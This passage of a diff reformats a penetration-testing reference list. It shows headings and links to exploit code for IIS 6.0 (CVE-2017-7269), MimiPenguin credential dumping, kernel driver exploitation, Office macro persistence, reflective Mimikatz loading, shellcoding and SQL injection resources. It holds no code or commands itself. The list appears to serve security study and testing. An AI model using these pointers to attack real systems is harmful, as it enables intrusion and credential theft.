--   [*https://github.com/edwardz246003/IIS\_exploit/blob/master/exploit.py*](https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py)
--   [*https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb*](https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb)
--   [*https://www.exploit-db.com/exploits/41738/*](https://www.exploit-db.com/exploits/41738/)
+### Old AccessChk.exe
 
-[]{#anchor-484}MimiPenguin
+-   [[https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe]{.underline}](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe)
 
--   [*https://github.com/huntergregal/mimipenguin*](https://github.com/huntergregal/mimipenguin)
+### DLL Injection
 
-[]{#anchor-485}HackSys Extreme Vulnerable Driver (HEVD)
+-   [[http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1]{.underline}](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1)
 
--   [*https://github.com/hacksysteam/HackSysExtremeVulnerableDriver*](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)
+### MS14-068 (Pass-the-Credential Cache)
 
-[]{#anchor-486}HackSysTeam-KernelPwn (\@FuzzySec, uses HEVD)
+-   [[https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/]{.underline}](https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/)
 
--   [*https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn*](https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn)
+-   [[https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/]{.underline}](https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/)
 
-[]{#anchor-487}Less Dirty Cow (Crontab)
+### Dumping Credentials
 
--   [*https://github.com/securifera/cowcron*](https://github.com/securifera/cowcron)
+-   [[https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/]{.underline}](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)
 
-[]{#anchor-488}Shellcode Via JavaScript Via VBA (\@subTee)
+### IIS 6.0 Exploit (CVE-2017-7269)
 
--   [*https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3\#file-example-js-L5-L6*](https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3#file-example-js-L5-L6)
+-   [[https://github.com/edwardz246003/IIS\_exploit/blob/master/exploit.py]{.underline}](https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py)
 
-[]{#anchor-489}Office Add-In Persistence (\@William\_Knows)
+-   [[https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb]{.underline}](https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb)
 
--   [*https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/*](https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/)
+-   [[https://www.exploit-db.com/exploits/41738/]{.underline}](https://www.exploit-db.com/exploits/41738/)
 
-[]{#anchor-490}DLL Tricks with VBA to Improve Offensive Macro Capability
+### MimiPenguin
 
--   [*https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/*](https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/)
+-   [[https://github.com/huntergregal/mimipenguin]{.underline}](https://github.com/huntergregal/mimipenguin)
 
-[]{#anchor-491}WePWNise - Office Template Persistence
+### HackSys Extreme Vulnerable Driver (HEVD)
 
--   [*https://github.com/mwrlabs/wePWNise*](https://github.com/mwrlabs/wePWNise)
+-   [[https://github.com/hacksysteam/HackSysExtremeVulnerableDriver]{.underline}](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)
 
-[]{#anchor-492}Sentinel DLL/EXE Path Hijacking Detection Tool
+### HackSysTeam-KernelPwn (\@FuzzySec, uses HEVD)
 
--   [*https://skanthak.homepage.t-online.de/sentinel.html*](https://skanthak.homepage.t-online.de/sentinel.html)
+-   [[https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn]{.underline}](https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn)
 
-[]{#anchor-493}Converting Mimikatz to a DLL to Be Loaded Reflectively
+### Less Dirty Cow (Crontab)
 
--   [*https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/*](https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/)
+-   [[https://github.com/securifera/cowcron]{.underline}](https://github.com/securifera/cowcron)
 
-[]{#anchor-494}Sandbox Breakouts (nodejs/javascript)
+### Shellcode Via JavaScript Via VBA (\@subTee)
 
--   [*http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine*](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)
+-   [[https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3\#file-example-js-L5-L6]{.underline}](https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3#file-example-js-L5-L6)
 
-[]{#anchor-495}Shellcoding
+### Office Add-In Persistence (\@William\_Knows)
 
-[]{#anchor-496}64-Bit Shellcoding Tutorial
+-   [[https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/]{.underline}](https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/)
 
--   [*http://mcdermottcybersecurity.com/articles/windows-x64-shellcode*](http://mcdermottcybersecurity.com/articles/windows-x64-shellcode)
+### DLL Tricks with VBA to Improve Offensive Macro Capability
 
-[]{#anchor-497}Portable Executable (PE) File Information
+-   [[https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/]{.underline}](https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/)
 
-[]{#anchor-498}An In-Depth Look into the Win32 Portable Executable File
-Format
+### WePWNise - Office Template Persistence
+
+-   [[https://github.com/mwrlabs/wePWNise]{.underline}](https://github.com/mwrlabs/wePWNise)
+
+### Sentinel DLL/EXE Path Hijacking Detection Tool
+
+-   [[https://skanthak.homepage.t-online.de/sentinel.html]{.underline}](https://skanthak.homepage.t-online.de/sentinel.html)
+
+### Converting Mimikatz to a DLL to Be Loaded Reflectively
+
+-   [[https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/]{.underline}](https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/)
+
+### Sandbox Breakouts (nodejs/javascript)
+
+-   [[http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine]{.underline}](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)
+
+Shellcoding
+-----------
+
+### 64-Bit Shellcoding Tutorial
+
+-   [[http://mcdermottcybersecurity.com/articles/windows-x64-shellcode]{.underline}](http://mcdermottcybersecurity.com/articles/windows-x64-shellcode)
+
+Portable Executable (PE) File Information
+-----------------------------------------
+
+### An In-Depth Look into the Win32 Portable Executable File Format
 
 -   PDF files have been saved to Google Drive as they are no longer
-    available from Microsoft. [*Part
-    1*](https://drive.google.com/open?id=12XHlJU8Art2PyfqpGcYF4K64IPIitXK6),
-    [*Part 1
-    Figures*](https://drive.google.com/open?id=1LZsLFq3MfLeeybbqmk6AM817bDjfng9r)
-    & [*Part
-    2*](https://drive.google.com/open?id=1xCtTgPR67vYz1YhVQV9uv4bhyk_8hlmD),
-    [*Part 2
-    Figures*](https://drive.google.com/open?id=1IuKuF16oFUP5cKA6dm7BPLiYFp1jcRYK)
+    > available from Microsoft. [[Part
+    > 1]{.underline}](https://drive.google.com/open?id=12XHlJU8Art2PyfqpGcYF4K64IPIitXK6),
+    > [[Part 1
+    > Figures]{.underline}](https://drive.google.com/open?id=1LZsLFq3MfLeeybbqmk6AM817bDjfng9r)
+    > & [[Part
+    > 2]{.underline}](https://drive.google.com/open?id=1xCtTgPR67vYz1YhVQV9uv4bhyk_8hlmD),
+    > [[Part 2
+    > Figures]{.underline}](https://drive.google.com/open?id=1IuKuF16oFUP5cKA6dm7BPLiYFp1jcRYK)
 
-[]{#anchor-499}SQL Injection
+SQL Injection
+-------------
 
--   [*https://websec.ca/kb/sql\_injection*](https://websec.ca/kb/sql_injection)
--   [*https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/*](https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/)
--   [*https://portswigger.net/web-security/sql-injection/cheat-sheet*](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+-   [[https://websec.ca/kb/sql\_injection]{.underline}](https://websec.ca/kb/sql_injection)
+
+-   [[https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/]{.underline}](https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/)
+
+-   [[https://portswigger.net/web-security/sql-injection/cheat-sheet]{.underline}](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
 -   
